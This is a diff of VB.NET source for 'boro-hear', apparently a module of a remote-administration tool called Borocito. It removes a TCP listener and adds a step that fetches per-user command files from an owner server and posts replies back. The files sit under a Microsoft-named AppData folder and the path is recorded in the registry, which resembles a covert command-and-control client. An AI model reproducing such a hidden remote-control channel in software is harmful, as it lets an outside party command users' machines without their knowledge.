@@ -1,9 +1,6 @@
 ﻿Imports System.Runtime.InteropServices
 Imports System.Text
-Imports System.IO.Compression
 Imports Microsoft.Win32
-Imports System.Net.Sockets
-Imports System.Threading
 Imports System.Net
 Imports System.IO
 Module Utility
@@ -11,7 +8,7 @@ Module Utility
     Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
         Try
             Dim OverWrite As Boolean = False
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\boro-hear.log") Then
+            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
                 OverWrite = True
             End If
             Dim finalContent As String = Nothing
@@ -22,7 +19,7 @@ Module Utility
             tlmContent = tlmContent & Message & vbCrLf
             Console.WriteLine("[" & from & "]" & finalContent & " " & content)
             Try
-                My.Computer.FileSystem.WriteAllText(DIRCommons & "\boro-hear.log", vbCrLf & Message, OverWrite)
+                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
             Catch
             End Try
         Catch ex As Exception
@@ -46,16 +43,16 @@ Module GlobalUses
     Public parameters As String
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-hear"
 
-    Public borocitoPort As Integer
     Public HttpOwnerServer As String
     Public UID As String
+
+    Public sendStatus As Boolean = True
 End Module
 Module StartUp
     Sub Init()
         Try
             CommonActions()
             CheckInstall()
-            IniciarComunicacionConExternos()
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
         End Try
@@ -80,8 +77,6 @@ Module StartUp
             regKey.SetValue("boro-hear", Application.ExecutablePath)
             regKey.SetValue("Name", My.Application.Info.AssemblyName)
             regKey.SetValue("Version", My.Application.Info.Version.ToString)
-            regKey.SetValue("tcp ip", ServerIP)
-            regKey.SetValue("tcp port", ServerIP)
 
             regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
@@ -92,126 +87,43 @@ Module StartUp
         End Try
     End Sub
 End Module
-Module hear_CONNECT
-    Dim SERVIDOR As TcpListener
-    Dim THREADSERVIDOR As Thread
-    Public ServerIP As String = "localhost"
-    Public ServerPort As Integer = 59687
-    Private Structure NUEVOCLIENTE
-        Public SOCKETCLIENTE As Socket
-        Public THREADCLIENTE As Thread
-        Public MENSAJE As String
-    End Structure
-    Dim CLIENTES As New Hashtable
-    Dim CLIENTEIP As IPEndPoint
-
-    Sub IniciarComunicacionConExternos()
-        SERVIDOR = New TcpListener(IPAddress.Any, ServerPort) 'CONEXION
-        SERVIDOR.Start()
-        THREADSERVIDOR = New Thread(AddressOf ESCUCHAR) 'PARA RECIBIR LAS CONEXIONES DE LOS CLIENTES
-        THREADSERVIDOR.Start()
-    End Sub
-    Public Sub ESCUCHAR() 'PARA RECIBIR LAS CONEXIONES DE LOS CLIENTES
-        Dim CLIENTE As New NUEVOCLIENTE
-        While True
-            Try
-                CLIENTE.SOCKETCLIENTE = SERVIDOR.AcceptSocket 'NUEVA CONEXION DE CLIENTE
-                CLIENTEIP = CLIENTE.SOCKETCLIENTE.RemoteEndPoint 'IP DEL CLIENTE
-                CLIENTE.THREADCLIENTE = New Thread(AddressOf LEER) 'PARA RECIBIR LOS MENSAJES DE LOS CLIENTES
-                CLIENTES.Add(CLIENTEIP, CLIENTE) 'LO AÑADE AL HASTABLE CLIENTES
-                CLIENTE.THREADCLIENTE.Start()
-            Catch ex As Exception
-            End Try
-        End While
-    End Sub
-    Public Sub LEER() 'PARA RECIBIR LOS MENSAJES DE LOS CLIENTES
-        Dim CLIENTE As New NUEVOCLIENTE
-        Dim DATOS() As Byte
-        Dim IP As IPEndPoint = CLIENTEIP 'OBTIENE LA IP Y PUERTO DEL CLIENTE
-        CLIENTE = CLIENTES(IP)
-        While True
-            If CLIENTE.SOCKETCLIENTE.Connected Then
-                DATOS = New Byte(1024) {}
-                Try
-                    If CLIENTE.SOCKETCLIENTE.Receive(DATOS, DATOS.Length, 0) > 0 Then
-                        CLIENTE.MENSAJE = Encoding.ASCII.GetString(DATOS) 'MENSAJE RECIBIDO
-                        CLIENTES(IP) = CLIENTE
-                        ACCIONES(IP) 'EJECUTA LA ACCION CORRESPONDIENTE EN FUNCION DEL MENSAJE RECIBIDO
-                    Else
-                        Exit While
-                    End If
-                Catch ex As Exception
-                    Exit While
-                End Try
-            End If
-        End While
-        CERRARTHREAD(IP)
-    End Sub
-
-    Private Sub ACCIONES(ByVal IDTerminal As IPEndPoint)
-        Dim MENSAJE As String = OBTENERDATOS(IDTerminal).Replace(vbNullChar, Nothing)
-        'procesarlo y enviarlo
-
-
-
-        ENVIARUNO(IDTerminal, "[OK]")
-    End Sub
-
-    Public Function OBTENERDATOS(ByVal IDCliente As IPEndPoint) As String
-        Dim CLIENTE As NUEVOCLIENTE
-        CLIENTE = CLIENTES(IDCliente)
-        Return CLIENTE.MENSAJE
-    End Function
-    Public Sub ENVIARUNO(ByVal IDCliente As IPEndPoint, ByVal Datos As String)
-        Dim Cliente As NUEVOCLIENTE
-        Cliente = CLIENTES(IDCliente)
-        Cliente.SOCKETCLIENTE.Send(Encoding.ASCII.GetBytes(Datos))
-    End Sub
-    Public Sub ENVIARTODOS(ByVal Datos As String)
-        Dim CLIENTE As NUEVOCLIENTE
-        For Each CLIENTE In CLIENTES.Values
-            CLIENTE.SOCKETCLIENTE.Send(Encoding.ASCII.GetBytes(Datos))
-        Next
-    End Sub
-    Public Sub CERRARTHREAD(ByVal IP As IPEndPoint)
-        Dim CLIENTE As NUEVOCLIENTE = CLIENTES(IP)
-        Try
-            CLIENTE.THREADCLIENTE.Abort()
-        Catch ex As Exception
-            CLIENTES.Remove(IP)
-        End Try
-    End Sub
-    Public Sub CERRARTODO()
-        Dim CLIENTE As NUEVOCLIENTE
-        For Each CLIENTE In CLIENTES.Values
-            CLIENTE.SOCKETCLIENTE.Close()
-            CLIENTE.THREADCLIENTE.Abort()
-        Next
-    End Sub
-End Module
-Module server_CONNECT
+Module ResponseAdministrator
     Sub SendToServer(ByVal message As String)
         Try
-            'Create CMD file on server
-            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
-            request.Method = "POST"
-            Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
-                vbCrLf & "Command1>" &
-                vbCrLf & "Command2>" & message &
-                vbCrLf & "Command3>" &
-                vbCrLf & "[Response]" &
-                vbCrLf
-            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-            request.ContentType = "application/x-www-form-urlencoded"
-            request.ContentLength = byteArray.Length
-            Dim dataStream As Stream = request.GetRequestStream()
-            dataStream.Write(byteArray, 0, byteArray.Length)
-            dataStream.Close()
-            Dim response As WebResponse = request.GetResponse()
-            AddToLog("SendToServer@server_CONNECT", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
-            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
-            'End If
-            response.Close()
+            If sendStatus Then
+                AddToLog("SendToServer@server_CONNECT", "Processing: " & message, False)
+                'Create CMD file on server
+                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
+                request.Method = "POST"
+                'Obtener comando actual (evita interferir)
+                Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
+                Dim localCommandFile As String = DIRCommons & "\actualCommand.str"
+                If My.Computer.FileSystem.FileExists(localCommandFile) Then
+                    My.Computer.FileSystem.DeleteFile(localCommandFile)
+                End If
+                My.Computer.Network.DownloadFile(remoteCommandFile, localCommandFile)
+                Dim lineas = IO.File.ReadAllLines(localCommandFile)
+                'Prepara el mensaje
+                Dim postData As String = "ident=" & UID & "&text=" & "#boro-hear response (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
+                    vbCrLf & "Command1>" & lineas(1).Split(">"c)(1).Trim() &
+                    vbCrLf & "Command2>" &
+                    vbCrLf & "Command3>" &
+                    vbCrLf & "[Response]" &
+                    vbCrLf & "(BORO-HEAR) " & message
+                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
+                request.ContentType = "application/x-www-form-urlencoded"
+                request.ContentLength = byteArray.Length
+                Dim dataStream As Stream = request.GetRequestStream()
+                dataStream.Write(byteArray, 0, byteArray.Length)
+                dataStream.Close()
+                Dim response As WebResponse = request.GetResponse()
+                AddToLog("SendToServer@server_CONNECT", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
+                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
+                'End If
+                response.Close()
+            Else
+                AddToLog("SendToServer@server_CONNECT", "boro-hear paused. Can't process: " & message, False)
+            End If
         Catch ex As Exception
             AddToLog("SendToServer@server_CONNECT", "Error: " & ex.Message, True)
         End Try
